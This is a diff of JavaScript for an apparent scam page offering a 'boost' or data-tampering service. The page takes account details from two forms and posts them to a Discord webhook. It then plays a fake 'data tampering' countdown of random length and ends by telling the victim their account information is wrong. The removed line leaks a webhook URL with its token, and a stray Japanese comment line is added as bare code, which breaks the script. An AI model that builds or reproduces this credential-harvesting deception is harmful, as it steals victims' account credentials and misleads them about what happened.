@@ -1,10 +1,11 @@
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1383529796595613816/ub2mTIV7qRheXhiorjMOse8uGZ6FyMTX6HkYKVvrAdp9V7HXtBUAF0U8HtHAqOa0S6Zk';
+ランダム増減は要らない
+
+const WEBHOOK_URL = 'webhookのリンク';
 
 const form1 = document.getElementById('account-form');
 const form2 = document.getElementById('boost-form');
-const canvasContainer = document.getElementById('canvas-container');
 const canvas = document.getElementById('canvas');
-let ctx = null;
+const ctx = canvas.getContext('2d');
 
 let savedAccount = {};
 
@@ -101,14 +102,11 @@ form2.addEventListener('submit', async (e) => {
   await sendToWebhook(embed);
 
   form2.classList.add('hidden');
-  canvasContainer.classList.remove('hidden');
-
-  if (!ctx) ctx = canvas.getContext('2d');
+  canvas.classList.remove('hidden');
   startCanvasCountdown();
 });
 
 function startCanvasCountdown() {
-  if (!ctx) ctx = canvas.getContext('2d');
   let seconds = Math.floor(Math.random() * 240) + 60;
 
   const interval = setInterval(() => {
@@ -116,17 +114,13 @@ function startCanvasCountdown() {
     ctx.font = '28px Segoe UI';
     ctx.fillStyle = 'black';
     ctx.textAlign = 'center';
-    ctx.textBaseline = 'middle';
-
-    const centerX = canvas.width / 2;
 
     if (seconds > 0) {
       const m = Math.floor(seconds / 60);
       const s = String(seconds % 60).padStart(2, '0');
       const dots = ['.', '..', '...'][Math.floor(Date.now() / 500) % 3];
-
-      ctx.fillText(`データ改竄中${dots}`, centerX, 60);
-      ctx.fillText(`残り ${m}分${s}秒`, centerX, 120);
+      ctx.fillText(`データ改竄中${dots}`, canvas.width / 2, 60);
+      ctx.fillText(`残り ${m}分${s}秒`, canvas.width / 2, 120);
 
       seconds--;
       const direction = Math.random() < 0.5 ? -1 : 1;
@@ -135,9 +129,8 @@ function startCanvasCountdown() {
     } else {
       clearInterval(interval);
       ctx.fillStyle = 'red';
-      ctx.fillText('改竄処理に失敗しました。', centerX, 60);
-      ctx.fillText('アカウントの情報が正しいか確認してください。', centerX, 120);
+      ctx.fillText('改竄処理に失敗しました。', canvas.width / 2, 60);
+      ctx.fillText('アカウントの情報が正しいか確認してください。', canvas.width / 2, 120);
     }
   }, 1000);
 }
-
